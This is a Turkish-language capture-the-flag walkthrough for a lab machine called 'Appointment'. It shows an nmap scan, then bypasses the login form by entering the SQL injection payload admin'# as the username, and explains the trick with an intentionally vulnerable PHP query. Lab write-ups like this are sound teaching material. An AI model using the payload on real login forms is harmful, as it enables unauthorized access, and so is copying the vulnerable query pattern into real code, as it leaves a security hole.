---
glightbox: true
---

# Appointment

!!! info "Target IP Address"

    10.129.219.149

Hedef makine için Nmap taraması gerçekleştir:

```bash
nmap 10.129.219.149 -Pn -sV -p 80
```

```text title="Output" hl_lines="6"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 23:27 +03
Nmap scan report for 10.129.219.149
Host is up.

PORT   STATE    SERVICE VERSION
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.43 seconds
```

Web tarayıcısında [http://10.129.219.149](http://10.129.219.149) adresine git. Giriş formunda kullanıcı adı kısmına `admin'#` ve parola kısmına boşluk olmayan herhangi bir karakter gir.

Kullanıcı adı kısmına girilen bu değer sayesinde yanlış parola ile dahi giriş yapılabilir. Çünkü kullanıcı girdisini doğru şekilde kontrol etmeyen bir PHP kodu aşağıdaki gibi gözükebilir:

```php title="example.php" linenums="1" hl_lines="1"
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
$result=mysql_query($sql);
$count=mysql_num_rows($result);
if ($count==1){
    $_SESSION['username'] = $username;
    $_SESSION['password'] = $password;
    header("location:home.php");
}
```

Kullanıcı adı olarak `admin'#` değeri verildiğinde SQL satırı aşağıdaki gibi olur:

```php
$sql="SELECT * FROM users WHERE username='admin'# AND password='$password'";
```

Bu sorgu hatasız çalışacağından `$count` değişkenin değeri `1` olur ve giriş başarılı olur.
